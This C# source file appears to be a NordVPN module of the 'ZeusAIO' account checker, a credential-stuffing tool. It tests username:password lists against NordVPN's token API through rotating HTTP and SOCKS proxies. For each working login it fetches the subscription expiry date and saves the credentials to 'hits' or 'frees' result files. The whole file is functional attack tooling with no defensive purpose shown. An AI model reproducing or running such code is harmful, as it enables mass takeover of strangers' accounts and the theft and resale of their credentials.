using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;
using Newtonsoft.Json.Linq;
using Newtonsoft.Json;

namespace NordVpn
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest req = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                req.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                req.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                req.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            req.IgnoreProtocolErrors = true;
                            req.KeepAlive = true;
                            req.AllowAutoRedirect = true;
                            req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            req.AddHeader("Accept", "*/*");
                            req.AddHeader("Pragma", "no-cache");
                            req.UserAgent = "NordApp android (playstore/2.8.6) Android 9.0.0";
                            var res = req.Post("https://zwyr157wwiu6eior.com/v1/users/tokens", "username=" + s[0] + "&password=" + s[1], "application/x-www-form-urlencoded").ToString();

                            switch (res)
                            {
                                case string a when res.Contains("Unauthorized"):
                                    break;
                                case string b when res.Contains("user_id"):
                                    var token = Check.Parse(res, "token\":\"", "\"");
                                    var fff = "token:" + token;
                                    var base64 = Convert.ToBase64String(Encoding.ASCII.GetBytes(fff));
                                    req.AddHeader("Authorization", "Basic " + base64);
                                    var parsedreq = Check.Parse(req.Get("https://zwyr157wwiu6eior.com/v1/users/services", null).ToString(), "expires_at\":\"", "\"");
                                    DateTime time1 = Convert.ToDateTime(DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                                    DateTime time2 = Convert.ToDateTime(parsedreq);
                                    var expire = "Expires: " + parsedreq;
                                    if (DateTime.Compare(time1, time2) < 0)
                                    {
                                        try
                                        {
                                            int expyear = time2.Year;
                                            ZeusAIO.mainmenu.hits++;
                                            if (Config.config.LogorCui == "2")
                                            {
                                                Console.WriteLine("[HIT - NORDVPN] " + s[0] + ":" + s[1] + " | Expiration Date: " + expire, expyear.ToString(), Color.Yellow);
                                            }
                                            Export.AsResult("/NordVpn_hits", s[0] + ":" + s[1] + " | ExpirationDate: " + expire);
                                        }
                                        catch
                                        {
                                            ZeusAIO.mainmenu.errors++;
                                            goto Retry;
                                        }
                                    }
                                    else
                                    {
                                        if (Config.config.LogorCui == "2")
                                        {
                                            Console.WriteLine("[FREE - NORDVPN] " + s[0] + ":" + s[1], Color.OrangeRed);
                                        }
                                        Export.AsResult("/NordVpn_frees", s[0] + ":" + s[1]);
                                    }
                                    break;
                                default:
                                    ZeusAIO.mainmenu.errors++;
                                    goto Retry;
                                    break;
                            }
                        }
                    }
                    catch (Exception err)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }
    }
}


           